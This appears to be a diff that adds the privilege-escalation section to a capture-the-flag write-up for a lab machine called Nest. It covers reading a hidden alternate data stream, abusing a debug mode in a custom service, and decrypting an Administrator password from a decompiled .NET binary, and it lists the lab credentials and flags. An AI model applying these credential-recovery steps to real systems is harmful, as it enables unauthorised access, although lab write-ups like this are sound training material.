@@ -288,6 +288,200 @@ Plaintext: xRxRxPANCAK3SxRxRx
 - Now, we have this new set of credentials `c.smith:xRxRxPANCAK3SxRxRx`
 - Let's connect to the User share as C.smith
 - Inside `Users\C.Smith\` there is user flag `user.txt`
+- There is also a folder named `HQK Reporting` containing a `HQK_Config_Backup.xml`
+
+```xml
+<ServiceSettings>
+    <Port>4386</Port>
+    <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>
+```
+
+- There is also another file name `Debug Mode Password` which seems to be empty
+- It is strange that we have found an empty file
+
+```bash
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+
+altname: DEBUGM~1.TXT
+create_time:    Fri Aug  9 01:06:12 AM 2019 CEST
+access_time:    Fri Aug  9 01:06:12 AM 2019 CEST
+write_time:     Fri Aug  9 01:08:17 AM 2019 CEST
+change_time:    Wed Jul 21 08:47:12 PM 2021 CEST
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+
+smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
+smb: \C.Smith\HQK Reporting\> exit
+$ cat "Debug Mode Password.txt:Password"
+WBQ201953D8w
+```
+
+- We have a password ... It will be used later on I suppose
+- There is also an executable at `\AD Integration Module\HqkLdap.exe`
+
+---
+
+## PRIVILEGE ESCALATION
+
+- First thing, we can try to connect to the port 4386 using `telnet`
+
+```bash
+$ telnet ${IP} 4386
+> help
+
+This service allows users to run queries against databases 
+using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+
+> LIST
+
+Use the query ID numbers below with the RUNQUERY command and the
+directory names with the SETDIR command
+
+QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  COMPARISONS
+[1]   Invoices (Ordered By Customer)
+[2]   Products Sold (Ordered By Customer)
+[3]   Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+```
+
+- Using the XML above, we understand we are in `C:\Program Files\HQK\ALL QUERIES`
+- Hence using `SETDIR COMPARISIONS` we move to `C:\Program Files\HQK\ALL QUERIES\COMPARISIONS`
+- It seems that we can move through folders of the underline system
+- Let's see if we can move to `C:\Program Files\HQK`
+
+```bash
+> SETDIR ..
+> LIST
+QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+```
+
+- It seems that we can move between folders of the remote host
+- However, running any specified query gives just an error message
+
+```
+Invalid database configuration found. Please contact 
+your system administrator
+```
+
+- There is only one last command `DEBUG <password>`
+- Running `HELP DEBUG` gives the following output
+
+```
+DEBUG <Password>
+Enables debug mode, which allows the use of additional commands to 
+use for troubleshooting network and configuration issues. Requires 
+a password which will be set by your system administrator when the 
+service was installed
+
+Examples: 
+DEBUG MyPassw0rd     Attempts to enable debug mode by using the
+                     password "MyPassw0rd"
+```
+
+- We can try to use the password we have previously found
+
+```bash
+> DEBUG WBQ201953D8w
+Debug mode enabled. Use the HELP command to view additional 
+commands that are now available
+
+> HELP
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+```
+
+- Inside folder `C:\Program Files\HQK\LDAP` there is a file `Ldap.conf`
+- Running `SHOWQUERY 2` gives us the following result
+
+```
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+```
+
+- Iteresting, now we have an encrypted version of the Administrator password
+- In the same folder there is also an executable `HqkLdap.exe`
+- This executable is the same we found previously.
+- We can try to see if inspecting the Executable we can find some answers
+- First thing we can use a tool called [Detect-It-Easy (DIE)](https://github.com/horsicq/Detect-It-Easy)
+- This tool gives us some informations
+
+1. Compiled with VB.NET (meaning that the programming language is BASIC)
+2. It is no packed
+3. Library used is .NET (v4.0.30319)
+4. The operating system is Windows(95)
+5. The entry point is at address 0x00404e2e and the base address is 0x00400000
+
+- This tool gives us some basic informations
+- To get a more deeper understanding we need to use decompilers
+- Notice that, since it is a .NET-based executable we have to use decompilers like dnSpy or Codermex
+- For the purpose of this problem I will use Codermex
+- Once opened, if we look at `HqkLdap` module we can see the `DS` function
+- It does the decryption by calling another function `RD`.
+- A quick comparision shows that this function and the one in `Utils.vb` are the same
+- Hence we can re-use the previous script just changing the password.
+- The new line will be
+
+```cs
+Decrypt(
+    "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", 
+    "667912", "1313Rf99", 3, 
+    "1L1SA61493DRV53Z", 256
+);
+```
+
+- Then we compile, execute and obtain `XtH4nkS4Pl4y1nGX`
+- At this point we can log as Administrator in the SMB client in the `Users` share
+- Once in the share, under `Administrator` we find a file `flag.txt - Shortcut.lnk`
+- If we donwload this file and inspect it using the `file` command
+
+```
+flag.txt - Shortcut.lnk: MS Windows shortcut, Points to a file or directory, 
+Has Relative path, Has Working directory, Unicoded, HasEnvironment 
+"\\Htb-nest\c$\Users\Administrator\Desktop\flag.txt"
+```
+
+- We see that the real file is under the `C$` share
+- Get access to the share
+
+```bash
+$ smbclient -U Administrator \\\\${IP}\\C$
+smb: \> cd Users\Administrator\Desktop\
+smb: \Users\Administrator\DEsktop\> get root.txt
+smb: \Users\Administrator\DEsktop\> exit
+$ cat root.txt
+deb3dfe1f1ab3470049665f5b5c2c5e5
+```
 
 ---
 
@@ -295,4 +489,4 @@ Plaintext: xRxRxPANCAK3SxRxRx
 
 USER: aac7dba51b0934b8745f36cd2b5f1f14
 
-ROOT: 
+ROOT: deb3dfe1f1ab3470049665f5b5c2c5e5
